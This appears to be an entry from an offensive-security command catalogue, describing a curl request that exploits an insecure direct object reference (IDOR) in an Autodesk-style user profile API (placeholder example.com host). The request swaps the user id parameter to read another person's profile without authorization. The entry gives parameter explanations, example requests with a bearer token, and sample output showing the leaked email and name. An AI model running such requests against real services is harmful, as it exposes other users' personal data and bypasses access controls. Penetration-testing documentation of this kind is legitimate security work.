---
id: cmd-uuid-9012
data: >-
  curl -X GET
  "https://autodesk-api.example.com/api/user/profile?id=TARGET_USER_ID" -H
  "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json"
tags:
  - api
  - recon
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.580Z'
verified: false
validated: true
submitted: true
---
# curl-idor-profile-access

## Command

```bash
curl -X GET "https://autodesk-api.example.com/api/user/profile?id=TARGET_USER_ID" -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json"
```

## Description

This command uses curl to send a GET request to the Autodesk User Profile API with a manipulated 'id' parameter, exploiting IDOR to access another user's profile data without authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `URL with ?id=TARGET_USER_ID` | The API endpoint URL with the target user ID in the query parameter | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Authentication header with JWT or API token | Yes |
| `-H "Content-Type: application/json"` | Sets the content type for the request | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://autodesk-api.example.com/api/user/profile?id=12346" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://autodesk-api.example.com/api/user/profile?id=12346" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json" -v
```

## Expected Output

Successful execution returns a JSON object with the target user's profile, e.g., {"id": "12346", "email": "target@example.com", "name": "Target User"}. Errors may include 403 if authorization is enforced, but in vulnerable cases, data is returned without issues.

## Related

- [[Related Procedure: Exploit-IDOR-in-User-Profile-API]]
